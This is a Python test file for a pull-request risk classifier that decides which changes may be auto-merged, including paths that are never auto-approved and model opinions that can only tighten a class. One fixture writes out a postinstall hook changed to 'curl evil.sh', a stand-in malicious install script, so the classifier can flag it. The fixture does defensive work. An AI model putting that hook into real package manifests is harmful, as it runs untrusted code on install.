from __future__ import annotations

import pytest

from tenure import config
from tenure.classify import ORDER, ChangedFile, Classification, classify, tighten
from tenure.globs import matches

POLICY = config.RepoPolicy()


def f(path, status="modified", additions=1, deletions=0, patch=None, previous_path=None):
    return ChangedFile(path, status, additions, deletions, patch, previous_path)


def cls(*files, policy=POLICY):
    return classify(list(files), policy).change_class


# ── globs: which way to be wrong ─────────────────────────────────────────────

@pytest.mark.parametrize("path, pattern, sensitive, expected", [
    ("src/oms/order.rs", "src/oms/**", True, True),
    ("src/oms", "src/oms/**", True, True),
    ("src/omsx/a.rs", "src/oms/**", True, False),
    ("a/b/README.md", "*.md", False, True),
    ("notes.md/run.sh", "*.md", False, False),       # a directory named like docs is not docs
    ("src/risk/limits.rs", "*risk*", True, True),    # sensitive: any component
    ("src/risk/limits.rs", "*risk*", False, False),  # harmless-looking: file name only
    (".github/workflows/ci.yml", ".github/**", True, True),
    ("pkg/CODEOWNERS", "CODEOWNERS", True, True),
    ("docs/guide/intro.md", "docs/**", False, True),
])
def test_glob_semantics(path, pattern, sensitive, expected):
    assert matches(path, pattern, sensitive=sensitive) is expected


# ── never-auto ───────────────────────────────────────────────────────────────

@pytest.mark.parametrize("path", [
    ".github/workflows/ci.yml", ".tenure.yml", "CODEOWNERS", "docs/CODEOWNERS", ".gitmodules",
    "LICENSE", "AGENTS.md", "CLAUDE.md", ".cursorrules", ".claude/settings.json", "Jenkinsfile",
])
def test_built_in_never_auto(path):
    assert cls(f(path)) == "never"


def test_agent_instructions_are_not_docs_even_though_they_are_markdown():
    assert cls(f("README.md")) == "docs"
    assert cls(f("AGENTS.md")) == "never"


def test_renaming_out_of_a_sensitive_path_is_still_sensitive():
    moved = f("docs/ci.md", "renamed", previous_path=".github/workflows/ci.yml")
    assert cls(moved) == "never"


def test_repo_can_add_never_auto_paths():
    policy = config.parse("never_auto: ['src/oms/**']")
    assert cls(f("src/oms/order_manager.rs"), policy=policy) == "never"
    assert cls(f("src/strategy/x.rs"), policy=policy) == "code"


def test_repo_cannot_remove_built_in_never_auto():
    policy = config.parse("never_auto: ['src/oms/**']")
    assert ".github/**" in policy.never_auto


# ── ordinary classes ─────────────────────────────────────────────────────────

def test_docs_tests_code():
    assert cls(f("README.md"), f("docs/a.md")) == "docs"
    assert cls(f("tests/test_x.py", additions=10)) == "tests"
    assert cls(f("README.md"), f("tests/test_x.py")) == "tests"
    assert cls(f("src/main.rs")) == "code"
    assert cls() == "code"                                       # nothing changed: nothing to trust


def test_weakening_tests_is_not_a_tests_change():
    assert cls(f("tests/test_x.py", status="removed")) == "code"
    assert cls(f("tests/test_x.py", additions=2, deletions=30)) == "code"


def test_moving_code_into_tests_counts_as_code():
    moved = f("tests/helper.py", "renamed", previous_path="src/core.py")
    assert cls(moved) == "code"


# ── dependencies ─────────────────────────────────────────────────────────────

PATCH_BUMP = '@@ -10,1 +10,1 @@\n-serde = "1.0.200"\n+serde = "1.0.210"\n'
MINOR_BUMP = '@@ -10,1 +10,1 @@\n-serde = "1.0.200"\n+serde = "1.1.0"\n'
SCRIPT = '@@ -3,1 +3,1 @@\n-"postinstall": "node a.js 1.0"\n+"postinstall": "curl evil.sh 1.1"\n'
GIT_SOURCE = '@@ -3,1 +3,1 @@\n-foo = "1.2.3"\n+foo = { git = "https://x/y", tag = "1.2.4" }\n'


def test_patch_bump_with_its_lockfile_is_deps_patch():
    """Dependabot never sends a bump without its lockfile; if the lockfile made
    it 'deps', no real patch bump could ever qualify."""
    assert cls(f("Cargo.toml", patch=PATCH_BUMP), f("Cargo.lock")) == "deps_patch"


def test_minor_bump_is_deps():
    assert cls(f("Cargo.toml", patch=MINOR_BUMP), f("Cargo.lock")) == "deps"


def test_lockfile_alone_is_deps_not_patch():
    assert cls(f("Cargo.lock")) == "deps"


@pytest.mark.parametrize("patch", [SCRIPT, GIT_SOURCE, "@@\n-[dependencies]\n+[dev-dependencies]\n"])
def test_manifest_changes_that_are_not_bumps_are_code(patch):
    assert cls(f("package.json", patch=patch)) == "code"


def test_manifest_without_a_diff_is_code():
    """GitHub omits the diff for large files; unseen is not harmless."""
    assert cls(f("package.json", patch=None)) == "code"


def test_new_manifest_is_code():
    assert cls(f("services/api/package.json", status="added", patch='+{"version": "1.0.0"}')) == "code"


# ── a second opinion can only tighten ────────────────────────────────────────

def test_tighten_moves_up_and_never_down():
    base = Classification("tests", ("t",), "v")
    assert tighten(base, "code", "model says code").change_class == "code"
    assert tighten(base, "docs", "model says docs").change_class == "tests"
    assert tighten(base, "banana", "model is confused").change_class == "code"


@pytest.mark.parametrize("start", ORDER)
@pytest.mark.parametrize("proposal", [*ORDER, "garbage", ""])
def test_tighten_never_lowers_any_class(start, proposal):
    result = tighten(Classification(start, (), "v"), proposal, "why")
    assert ORDER.index(result.change_class) >= ORDER.index(start)


def test_never_stays_never_whatever_the_model_says():
    policy = config.parse("never_auto: ['src/oms/**']")
    c = classify([f("src/oms/order_manager.rs")], policy)
    assert tighten(c, "docs", "model thinks it's docs").change_class == "never"


# ── the policy file ──────────────────────────────────────────────────────────

@pytest.mark.parametrize("text", [
    "never-auto: ['x']",                   # a typo must not quietly disable protection
    "never_auto: 'src/**'",
    "max_grant_days: 365",
    "max_grant_days: true",
    "agents: {dependabot: 1}",
    "- just\n- a list",
    "never_auto: [",
])
def test_bad_policy_files_are_errors_not_defaults(text):
    with pytest.raises(config.ConfigError):
        config.parse(text)


def test_empty_policy_file_is_defaults():
    assert config.parse("") == config.RepoPolicy()
    assert config.parse(None) == config.RepoPolicy()


def test_rule_version_changes_with_the_rules():
    assert config.parse("never_auto: ['a/**']").rule_version != config.RepoPolicy().rule_version
    assert config.parse("max_grant_days: 30").rule_version == config.RepoPolicy().rule_version
